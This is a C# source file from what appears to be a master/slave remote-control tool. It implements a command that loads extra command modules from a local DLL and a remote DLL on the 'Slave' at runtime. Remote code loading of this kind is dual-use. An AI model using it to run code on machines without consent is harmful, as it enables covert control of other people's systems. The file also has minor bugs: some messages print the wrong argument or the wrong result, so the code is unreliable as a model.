using System;
using System.Collections.Generic;
using System.IO;
using System.Linq;
using System.Reflection;
using Master.AdvancedConsole;
using Master.Commands.Core;
using Shared;

namespace Master.Commands
{
    internal class LoadCommands : IMasterCommand, IPreProcessCommand
    {
        public string name { get; } = "loadcommands";

        public string description { get; } = "Load commands from a local and a remote DLL, allowing you to add commands at runtime.";

        public bool isLocal { get; } = false;

        public List<string> validArguments { get; } = new List<string>()
        {
            "?*:[localCommandDLL] ?:[remoteCommandDLL]"
        };

        public bool PreProcess(List<string> args)
        {
            if (!File.Exists(args[0]))
            {
                ColorTools.WriteCommandError($"Couldn't find local DLL at {args[0]}");
                return false;
            }

            return true;
        }
        
        public void Process(List<string> args)
        {
            var result = GlobalCommandsManager.networkManager.ReadLine();
            if (result == "KO")
            {
                ColorTools.WriteCommandError($"IO exception encountered when reading remote DLL at {args[1]}");
                return;
            }

            result = GlobalCommandsManager.networkManager.ReadLine();
            if (result == "KO")
            {
                ColorTools.WriteCommandError("No classes implementing the ICommand interface were found on the remote DLL");
                return;
            }

            ColorTools.WriteMessage("Loaded commands on Slave :");
            ColorTools.WriteMessage(result.Split(' ').Aggregate((x, y) => $"{x}\n{y}"));

            var path = args[0];
            Assembly loadedAssembly;

            try
            {
                loadedAssembly = Assembly.LoadFrom(path);
            }
            catch (Exception)
            {
                ColorTools.WriteCommandError($"IO exception encountered when reading local DLL at {args[1]}");
                return;
            }

            // Instanciate command classes
            var loadedCommands = GlobalCommandsManager.LoadICommandsFromAssembly(new[] { loadedAssembly });
            if (loadedCommands.Count == 0)
            {
                ColorTools.WriteCommandError("No classes implementing the ICommand interface were found on the local DLL");
                return;
            }

            // Update autocompletion command list
            AutoCompletionManager.commands.AddRange(loadedCommands);

            ColorTools.WriteMessage("Loaded commands on Master :");
            ColorTools.WriteMessage(result.Split(' ').Aggregate((x, y) => $"{x}\n{y}"));

        }
    }
}
